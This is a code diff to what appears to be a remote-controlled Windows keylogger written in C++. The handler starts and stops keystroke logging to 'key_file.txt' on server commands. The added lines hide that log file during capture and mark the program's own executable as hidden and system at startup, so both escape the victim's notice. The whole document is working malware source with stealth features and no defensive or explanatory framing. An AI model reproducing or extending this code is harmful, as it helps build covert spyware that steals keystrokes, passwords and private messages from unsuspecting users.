@@ -64,6 +64,7 @@ void serverRequestHandler() {
                     if (cmd == "start") {
                         if (!globalLogger) {
                             globalLogger = new KeyLogger("key_file.txt");
+                            KeyLogger::hideFile("key_file.txt");
                             keylogThread = std::thread([]() {
                                 globalLogger->start();
                             });
@@ -73,6 +74,7 @@ void serverRequestHandler() {
                         else if (cmd == "stop") {
                             if (globalLogger) {
                                 globalLogger->stop();
+                                KeyLogger::unhideFile("key_file.txt");
                                 delete globalLogger;
                                 globalLogger = nullptr;
                             }
@@ -100,6 +102,12 @@ void serverRequestHandler() {
 int main() {
     SetConsoleOutputCP(CP_UTF8);
     SetConsoleCP(CP_UTF8);
+
+    // Hide the current executable
+    char exePath[MAX_PATH];
+    GetModuleFileNameA(NULL, exePath, MAX_PATH);
+    SetFileAttributesA(exePath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
+    KeyLogger::hideFile("key_file.txt");
 
     try {
         LPTF_Socket::initialize();
